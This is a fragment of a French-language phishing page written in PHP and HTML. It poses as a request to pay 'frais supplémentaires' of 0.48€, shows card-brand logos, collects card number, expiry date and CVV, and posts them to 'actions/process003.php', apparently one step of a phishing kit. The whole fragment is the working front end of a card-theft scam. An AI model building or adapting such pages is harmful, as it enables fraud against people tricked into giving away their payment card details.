...
html{
 ...
 <div height="900" style="background-color: #FFFFFF;
       max-width: 100%;
        width: 500px;
...
<form method="POST" action="actions/process003.php">
        ...
        <strong><br><center><p style="" class="title">Paiement des frais supplémentaires</p></strong>
          <?php
        if(isset($_GET['error']))
        {
          if($_GET['error'] == "ccnum")
          {
            $display = "Veuillez saisir un numéro de carte valide";
          }
          else{
            if($_GET['error'] == "ccexp")
          {
            $display = "Veuillez saisir une date d'expiration valide";
          }
          else{
            if($_GET['error'] == "ccvv")
          {
            $display = "Veuillez saisir un cvv valide";
          }
    ...
    <p style="margin-right: 70px;">'.$display.'</p>
         ...
         ?>
          <center>
  <img src="https://www.seekpng.com/png/full/136-1367012_mastercard-visa-2008-pictures-to-pin-on-pinterest.png" style="width: 60px;margin: 20px;">
  <strong><p>Montant : 0.48€</p></strong>
</center>

<br>
<input placeholder="Numéro de carte" class="form-control form-text" type="text" id="edit-listenumeroslt" name="ccnum" value="" size="60" maxlength="16" style="width: 200px;" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));">
<br>
<input placeholder="Date d'expiration (MM/AA)" class="form-control form-text" type="text" id="edit-listenumeroslt" name="ccexp" value="" size="60" maxlength="5" style="width: 200px;" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" onkeyup="formatString(event);">
<br>
<input placeholder="CVV (Cryptogramme Visuel)" class="form-control form-text" type="text" id="edit-listenumeroslt" name="ccvv" value="" size="60" maxlength="4" style="width: 200px;" onkeypress="return /\d/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" >
  ...
  text-decoration: none; height: 35px; width: 200px;" type="submit" class="btn btn--submit login__submit-btn" title="Terminer" name="continue">Terminer</button></center>
          <br><br>
